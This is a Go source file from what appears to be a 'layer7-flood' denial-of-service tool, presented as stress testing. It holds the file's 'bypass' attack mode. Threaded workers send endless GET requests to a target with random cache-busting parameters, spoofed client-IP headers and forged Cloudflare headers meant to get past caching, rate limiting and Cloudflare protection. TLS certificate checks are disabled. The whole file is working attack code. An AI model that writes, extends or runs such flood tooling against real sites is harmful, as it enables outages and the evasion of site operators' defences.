// pkg/attacker/bypass.go
package attacker

import (
    "crypto/tls"
    "fmt"
    "net/http"
    "sync"
    "time"

    "github.com/stresstest/layer7-flood/pkg/config"
    "github.com/stresstest/layer7-flood/pkg/stats"
    "github.com/stresstest/layer7-flood/pkg/utils"
)

type Bypass struct {
    cfg     *config.Config
    stats   *stats.Collector
    workers []*BypassWorker
    wg      sync.WaitGroup
    stopCh  chan struct{}
}

type BypassWorker struct {
    id      int
    client  *http.Client
    cfg     *config.Config
    stats   *stats.Collector
    stopCh  <-chan struct{}
}

func NewBypass(cfg *config.Config, stats *stats.Collector) *Bypass {
    return &Bypass{
        cfg:     cfg,
        stats:   stats,
        workers: make([]*BypassWorker, 0),
        stopCh:  make(chan struct{}),
    }
}

func (b *Bypass) Start() {
    for i := 0; i < b.cfg.Attack.Threads; i++ {
        worker := &BypassWorker{
            id:     i,
            client: b.createBypassClient(),
            cfg:    b.cfg,
            stats:  b.stats,
            stopCh: b.stopCh,
        }
        b.workers = append(b.workers, worker)
        b.wg.Add(1)
        go worker.run()
    }
    b.wg.Wait()
}

func (b *Bypass) createBypassClient() *http.Client {
    transport := &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
            CipherSuites: []uint16{
                tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            },
            PreferServerCipherSuites: true,
            MinVersion:               tls.VersionTLS10,
            MaxVersion:               tls.VersionTLS13,
        },
        MaxIdleConnsPerHost: 100,
        DisableCompression:  false,
        DisableKeepAlives:   false,
    }
    
    return &http.Client{
        Transport: transport,
        Timeout:   30 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 10 {
                return http.ErrUseLastResponse
            }
            return nil
        },
    }
}

func (w *BypassWorker) run() {
    defer w.stats.DecrementActive()
    w.stats.IncrementActive()
    
    for {
        select {
        case <-w.stopCh:
            return
        default:
            req := w.createBypassRequest()
            start := time.Now()
            resp, err := w.client.Do(req)
            latency := time.Since(start)
            
            if err != nil {
                w.stats.RecordFailure(err.Error())
                continue
            }
            
            w.stats.RecordSuccess(resp.StatusCode, latency)
            resp.Body.Close()
        }
    }
}

func (w *BypassWorker) createBypassRequest() *http.Request {
    url := w.cfg.Target.URL
    
    // Use HTTP/2 preface for bypass attempts
    if w.cfg.Bypass.UseHTTP2 {
        url = fmt.Sprintf("%s?cacheBypass=%s", url, utils.RandomString(32))
    }
    
    req, _ := http.NewRequest("GET", url, nil)
    
    // Add bypass headers
    req.Header.Set("X-Forwarded-For", utils.RandomIP())
    req.Header.Set("X-Real-IP", utils.RandomIP())
    req.Header.Set("CF-Connecting-IP", utils.RandomIP())
    req.Header.Set("X-Originating-IP", utils.RandomIP())
    req.Header.Set("X-Remote-IP", utils.RandomIP())
    req.Header.Set("X-Remote-Addr", utils.RandomIP())
    req.Header.Set("X-Client-IP", utils.RandomIP())
    
    // Random cache-busting
    req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
    req.Header.Set("Pragma", "no-cache")
    req.Header.Set("Expires", "0")
    
    // Cloudflare bypass attempts
    req.Header.Set("CF-Ray", utils.RandomString(16))
    req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
    
    return req
}

func (b *Bypass) Stop() {
    close(b.stopCh)
    for _, w := range b.workers {
        w.client.CloseIdleConnections()
    }
    b.wg.Wait()
}
